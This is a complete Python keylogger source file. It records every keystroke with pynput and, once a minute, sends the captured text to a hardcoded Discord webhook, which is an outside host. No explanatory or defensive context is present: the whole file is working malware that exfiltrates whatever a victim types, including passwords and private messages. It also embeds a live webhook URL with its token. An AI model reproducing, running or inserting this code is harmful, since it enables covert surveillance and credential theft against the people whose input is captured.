
import aiohttp
from pynput import keyboard
import asyncio


class Execution:
    def __init__(self):
        self.text = ""
        self.json = None

    async def start(self):
        async with aiohttp.ClientSession() as self.sack:
            async with self.sack.post("https://discordapp.com/api/webhooks/1403615260086108242/5HAt7pcdjsTzMrWX7zvcHrU7UGn-SDpSuMLaWQFsoaKKOfeSHZySXVc7Y9POH1nxR_zQ", json=self.json):
                pass

    async def send_data(self):
            self.json = {
                "content": f"```{self.text}```"
            }
            await self.start()
            
    async def send_loop(self):
        while True:
            if self.text:
                await self.send_data()
                self.text = ""
            await asyncio.sleep(60)
                                
    def on_press(self, key):
        try:
            self.text += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.backspace:
                if len(self.text) > 0:
                    self.text = self.text[:-1]
                else:
                    pass
            else:
                self.text += f"\n{key}"
            

    async def run(self):
        with keyboard.Listener(on_press=self.on_press):
            await self.send_loop()


if __name__ == '__main__':
    execution = Execution()
    asyncio.run(execution.run())

    